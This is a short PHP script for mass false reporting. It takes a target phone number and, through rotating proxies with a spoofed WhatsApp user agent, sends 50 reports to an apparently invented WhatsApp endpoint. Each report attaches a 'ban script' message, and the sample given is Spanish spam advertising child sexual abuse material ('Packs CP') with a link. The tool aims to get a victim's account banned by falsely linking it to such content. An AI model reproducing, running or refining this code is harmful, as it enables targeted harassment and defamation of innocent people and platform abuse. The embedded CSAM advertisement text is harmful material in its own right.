<?php
$ban_scripts = [
    "🔥👅Unete al mejor grupo🍆con todos los👉🏿👊🏾💦 Packs CP y MORRITAS😋EN LÍNEA para😈 tener chat 💯🔥 y video llamada🔥🥵 AHORA⬇️⬇️⬇️⬇️⬇️⬇️⬇️ https://wlhatt.life/morritas-cp/+97256-883-8088P",
    // ... (add all ban scripts here)
];

$proxies = ['http://proxy1:port', 'http://proxy2:port']; // Add your proxies
$current_proxy = 0;

function rotate_proxy() {
    global $current_proxy, $proxies;
    $current_proxy = ($current_proxy + 1) % count($proxies);
    return $proxies[$current_proxy];
}

$target = readline("Enter target number (e.g., +1234567890): ");
for ($i = 0; $i < 50; $i++) {
    $proxy = rotate_proxy();
    $script = $ban_scripts[array_rand($ban_scripts)];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.whatsapp.com/v1/report');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['target' => $target, 'reason' => 'inappropriate', 'message' => $script]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json', 'User-Agent: WhatsApp/2.25.7 Android/14']);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    $response = curl_exec($ch);
    curl_close($ch);
    echo "Report " . ($i + 1) . " sent to $target\n";
    sleep(5); // 5-second proxy rotation
}
?>
